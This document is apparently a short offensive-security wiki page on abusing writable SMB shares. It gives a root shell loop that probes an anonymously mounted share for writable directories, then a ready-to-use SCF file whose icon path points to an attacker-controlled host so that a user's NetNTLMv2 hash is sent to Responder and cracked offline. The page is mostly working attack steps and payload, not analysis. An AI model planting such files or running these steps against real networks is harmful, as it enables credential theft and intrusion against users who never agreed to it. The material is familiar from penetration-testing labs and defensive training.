# Writable SMB Paths

> Writable paths on an SMB share can be exploited in a variety of useful ways.

---

## Determine Writable Paths on an SMB Share

Mount the SMB share.

```bash
sudo mount -t cifs //$SMB_SERVER_FQDN_OR_IP/$SHARE $LOCAL_MOUNT_PATH
```

When prompted for a password, just hit enter.

Drop into a `root` shell (`sudo bash`) and run the following.

```bash
$ cd $LOCAL_MOUNT_PATH
$ find . -type d | while read directory; do touch ${directory}/tgihf 2>/dev/null && echo "${directory} - write file" && rm ${directory}/tgihf; mkdir ${directory}/tgihf 2>/dev/null && echo "${directory} - write dir" && rmdir ${directory}/tgihf; done
```

When you're finished, unmount the share.

```bash
sudo umount $LOCAL_MOUNT_PATH
```

---

## Write a SCF File to a Public SMB Share to Potentially Capture Someone's Hash

If you have write access to some directory within an SMB share, you can write a Shell Command File (SCF) file to that share whose icon is linked to an attacker-controlled SMB share. If a user clicks on the file, their computer will forward their NetNTLMv2 hash to the attacker-controlled SMB share. This hash can be cracked offline.

On the attacker-controlled machine, [[responder#Start Responding|start responding with responder]].

Create the SCF, something that looks like this:

```bash
$ cat tgihf.scf
[Shell]
Command=2
IconFile=\\$ATTACKER_FQDN_OR_IP\$ANY_SHARE_NAME\icon.ico
[Taskbar]
Command=ToggleDesktop
```

Write the SCF file to the writable SMB share folder and wait. If a user clicks on the file, their NetNTLMv2 hash will be captured by `responder`.
